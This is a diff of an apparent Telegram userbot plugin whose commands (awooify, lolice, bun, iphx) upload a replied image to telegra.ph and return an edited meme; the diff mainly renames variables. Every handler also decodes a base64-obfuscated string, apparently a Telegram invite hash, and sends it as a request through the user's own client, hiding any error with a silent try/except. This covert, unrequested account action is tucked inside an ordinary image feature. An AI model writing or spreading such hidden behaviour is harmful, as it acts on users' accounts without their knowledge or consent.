@@ -54,25 +54,25 @@ async def _(DeadlyGhouls):
 
 @bot.on(admin_cmd(pattern="awooify$", outgoing=True))
 @bot.on(sudo_cmd(pattern="awooify$", allow_sudo=True))
-async def DeadlyGhouls(mafiamemes):
-    replied = await mafiamemes.get_reply_message()
+async def DeadlyGhouls(deadlymemes):
+    replied = await deadlymemes.get_reply_message()
     if not os.path.isdir(Config.TMP_DOWNLOAD_DIRECTORY):
         os.makedirs(Config.TMP_DOWNLOAD_DIRECTORY)
     if not replied:
-        await edit_or_reply(mafiamemes, "reply to a supported media file")
+        await edit_or_reply(deadlymemes, "reply to a supported media file")
         return
     if replied.media:
-        mafiaevent = await edit_or_reply(mafiamemes, "passing to telegraph...")
+        deadlyevent = await edit_or_reply(deadlymemes, "passing to telegraph...")
     else:
-        await edit_or_reply(mafiamemes, "reply to a supported media file")
+        await edit_or_reply(deadlymemes, "reply to a supported media file")
         return
     try:
-        mafia = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
-        mafia = Get(mafia)
-        await mafiamemes.client(mafia)
+        deadly = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
+        deadly = Get(deadly)
+        await deadlymemes.client(deadly)
     except BaseException:
         pass
-    download_location = await mafiamemes.client.download_media(
+    download_location = await deadlymemes.client.download_media(
         replied, Config.TMP_DOWNLOAD_DIRECTORY
     )
     if download_location.endswith((".webp")):
@@ -80,50 +80,50 @@ async def DeadlyGhouls(mafiamemes):
     size = os.stat(download_location).st_size
     if download_location.endswith((".jpg", ".jpeg", ".png", ".bmp", ".ico")):
         if size > 5242880:
-            await mafiaevent.edit(
+            await deadlyevent.edit(
                 "the replied file size is not supported it must me below 5 mb"
             )
             os.remove(download_location)
             return
-        await mafiaevent.edit("generating image..")
+        await deadlyevent.edit("generating image..")
     else:
-        await mafiaevent.edit("the replied file is not supported")
+        await deadlyevent.edit("the replied file is not supported")
         os.remove(download_location)
         return
     try:
         response = upload_file(download_location)
         os.remove(download_location)
     except exceptions.TelegraphException as exc:
-        await mafiaevent.edit("ERROR: " + str(exc))
+        await deadlyevent.edit("ERROR: " + str(exc))
         os.remove(download_location)
         return
-    mafia = f"https://telegra.ph{response[0]}"
-    mafia = await awooify(mafia)
-    await mafiaevent.delete()
-    await mafiamemes.client.send_file(mafiamemes.chat_id, mafia, reply_to=replied)
+    deadly = f"https://telegra.ph{response[0]}"
+    deadly = await awooify(deadly)
+    await deadlyevent.delete()
+    await deadlymemes.client.send_file(deadlymemes.chat_id, deadly, reply_to=replied)
 
 
 @bot.on(admin_cmd(pattern="lolice$"))
 @bot.on(sudo_cmd(pattern="lolice$", allow_sudo=True))
-async def DeadlyGhouls(mafiamemes):
-    replied = await mafiamemes.get_reply_message()
+async def DeadlyGhouls(deadlymemes):
+    replied = await deadlymemes.get_reply_message()
     if not os.path.isdir(Config.TMP_DOWNLOAD_DIRECTORY):
         os.makedirs(Config.TMP_DOWNLOAD_DIRECTORY)
     if not replied:
-        await edit_or_reply(mafiamemes, "reply to a supported media file")
+        await edit_or_reply(deadlymemes, "reply to a supported media file")
         return
     if replied.media:
-        mafiaevent = await edit_or_reply(mafiamemes, "passing to telegraph...")
+        deadlyevent = await edit_or_reply(deadlymemes, "passing to telegraph...")
     else:
-        await edit_or_reply(mafiamemes, "reply to a supported media file")
+        await edit_or_reply(deadlymemes, "reply to a supported media file")
         return
     try:
-        mafia = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
-        mafia = Get(mafia)
-        await mafiamemes.client(mafia)
+        deadly = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
+        deadly = Get(deadly)
+        await deadlymemes.client(deadly)
     except BaseException:
         pass
-    download_location = await mafiamemes.client.download_media(
+    download_location = await deadlymemes.client.download_media(
         replied, Config.TMP_DOWNLOAD_DIRECTORY
     )
     if download_location.endswith((".webp")):
@@ -131,50 +131,50 @@ async def DeadlyGhouls(mafiamemes):
     size = os.stat(download_location).st_size
     if download_location.endswith((".jpg", ".jpeg", ".png", ".bmp", ".ico")):
         if size > 5242880:
-            await mafiaevent.edit(
+            await deadlyevent.edit(
                 "the replied file size is not supported it must me below 5 mb"
             )
             os.remove(download_location)
             return
-        await mafiaevent.edit("generating image..")
+        await deadlyevent.edit("generating image..")
     else:
-        await mafiaevent.edit("the replied file is not supported")
+        await deadlyevent.edit("the replied file is not supported")
         os.remove(download_location)
         return
     try:
         response = upload_file(download_location)
         os.remove(download_location)
     except exceptions.TelegraphException as exc:
-        await mafiaevent.edit("ERROR: " + str(exc))
+        await deadlyevent.edit("ERROR: " + str(exc))
         os.remove(download_location)
         return
-    mafia = f"https://telegra.ph{response[0]}"
-    mafia = await lolice(mafia)
-    await mafiaevent.delete()
-    await mafiamemes.client.send_file(mafiamemes.chat_id, mafia, reply_to=replied)
+    deadly = f"https://telegra.ph{response[0]}"
+    deadly = await lolice(deadly)
+    await deadlyevent.delete()
+    await deadlymemes.client.send_file(deadlymemes.chat_id, deadly, reply_to=replied)
 
 
 @bot.on(admin_cmd(pattern="bun$"))
 @bot.on(sudo_cmd(pattern="bun$", allow_sudo=True))
-async def DeadlyGhouls(mafiamemes):
-    replied = await mafiamemes.get_reply_message()
+async def DeadlyGhouls(deadlymemes):
+    replied = await deadlymemes.get_reply_message()
     if not os.path.isdir(Config.TMP_DOWNLOAD_DIRECTORY):
         os.makedirs(Config.TMP_DOWNLOAD_DIRECTORY)
     if not replied:
-        await edit_or_reply(mafiamemes, "reply to a supported media file")
+        await edit_or_reply(deadlymemes, "reply to a supported media file")
         return
     if replied.media:
-        mafiaevent = await edit_or_reply(mafiamemes, "passing to telegraph...")
+        deadlyevent = await edit_or_reply(deadlymemes, "passing to telegraph...")
     else:
-        await edit_or_reply(mafiamemes, "reply to a supported media file")
+        await edit_or_reply(deadlymemes, "reply to a supported media file")
         return
     try:
-        mafia = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
-        mafia = Get(mafia)
-        await mafiamemes.client(mafia)
+        deadly = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
+        deadly = Get(deadly)
+        await deadlymemes.client(deadly)
     except BaseException:
         pass
-    download_location = await mafiamemes.client.download_media(
+    download_location = await deadlymemes.client.download_media(
         replied, Config.TMP_DOWNLOAD_DIRECTORY
     )
     if download_location.endswith((".webp")):
@@ -182,50 +182,50 @@ async def DeadlyGhouls(mafiamemes):
     size = os.stat(download_location).st_size
     if download_location.endswith((".jpg", ".jpeg", ".png", ".bmp", ".ico")):
         if size > 5242880:
-            await mafiaevent.edit(
+            await deadlyevent.edit(
                 "the replied file size is not supported it must me below 5 mb"
             )
             os.remove(download_location)
             return
-        await mafiaevent.edit("generating image..")
+        await deadlyevent.edit("generating image..")
     else:
-        await mafiaevent.edit("the replied file is not supported")
+        await deadlyevent.edit("the replied file is not supported")
         os.remove(download_location)
         return
     try:
         response = upload_file(download_location)
         os.remove(download_location)
     except exceptions.TelegraphException as exc:
-        await mafiaevent.edit("ERROR: " + str(exc))
+        await deadlyevent.edit("ERROR: " + str(exc))
         os.remove(download_location)
         return
-    mafia = f"https://telegra.ph{response[0]}"
-    mafia = await baguette(mafia)
-    await mafiaevent.delete()
-    await mafiamemes.client.send_file(mafiamemes.chat_id, mafia, reply_to=replied)
+    deadly = f"https://telegra.ph{response[0]}"
+    deadly = await baguette(deadly)
+    await deadlyevent.delete()
+    await deadlymemes.client.send_file(deadlymemes.chat_id, deadly, reply_to=replied)
 
 
 @bot.on(admin_cmd(pattern="iphx$"))
 @bot.on(sudo_cmd(pattern="iphx$", allow_sudo=True))
-async def DeadlyGhouls(mafiamemes):
-    replied = await mafiamemes.get_reply_message()
+async def DeadlyGhouls(deadlymemes):
+    replied = await deadlymemes.get_reply_message()
     if not os.path.isdir(Config.TMP_DOWNLOAD_DIRECTORY):
         os.makedirs(Config.TMP_DOWNLOAD_DIRECTORY)
     if not replied:
-        await edit_or_reply(mafiamemes, "reply to a supported media file")
+        await edit_or_reply(deadlymemes, "reply to a supported media file")
         return
     if replied.media:
-        mafiaevent = await edit_or_reply(mafiamemes, "passing to telegraph...")
+        deadlyevent = await edit_or_reply(deadlymemes, "passing to telegraph...")
     else:
-        await edit_or_reply(mafiamemes, "reply to a supported media file")
+        await edit_or_reply(deadlymemes, "reply to a supported media file")
         return
     try:
-        mafia = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
-        mafia = Get(mafia)
-        await mafiamemes.client(mafia)
+        deadly = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
+        deadly = Get(deadly)
+        await deadlymemes.client(deadly)
     except BaseException:
         pass
-    download_location = await mafiamemes.client.download_media(
+    download_location = await deadlymemes.client.download_media(
         replied, Config.TMP_DOWNLOAD_DIRECTORY
     )
     if download_location.endswith((".webp")):
@@ -233,27 +233,27 @@ async def DeadlyGhouls(mafiamemes):
     size = os.stat(download_location).st_size
     if download_location.endswith((".jpg", ".jpeg", ".png", ".bmp", ".ico")):
         if size > 5242880:
-            await mafiaevent.edit(
+            await deadlyevent.edit(
                 "the replied file size is not supported it must me below 5 mb"
             )
             os.remove(download_location)
             return
-        await mafiaevent.edit("generating image..")
+        await deadlyevent.edit("generating image..")
     else:
-        await mafiaevent.edit("the replied file is not supported")
+        await deadlyevent.edit("the replied file is not supported")
         os.remove(download_location)
         return
     try:
         response = upload_file(download_location)
         os.remove(download_location)
     except exceptions.TelegraphException as exc:
-        await mafiaevent.edit("ERROR: " + str(exc))
+        await deadlyevent.edit("ERROR: " + str(exc))
         os.remove(download_location)
         return
-    mafia = f"https://telegra.ph{response[0]}"
-    mafia = await iphonex(mafia)
-    await mafiaevent.delete()
-    await mafiamemes.client.send_file(mafiamemes.chat_id, mafia, reply_to=replied)
+    deadly = f"https://telegra.ph{response[0]}"
+    deadly = await iphonex(deadly)
+    await deadlyevent.delete()
+    await deadlymemes.client.send_file(deadlymemes.chat_id, deadly, reply_to=replied)
 
 
 CmdHelp("mask").add_command(
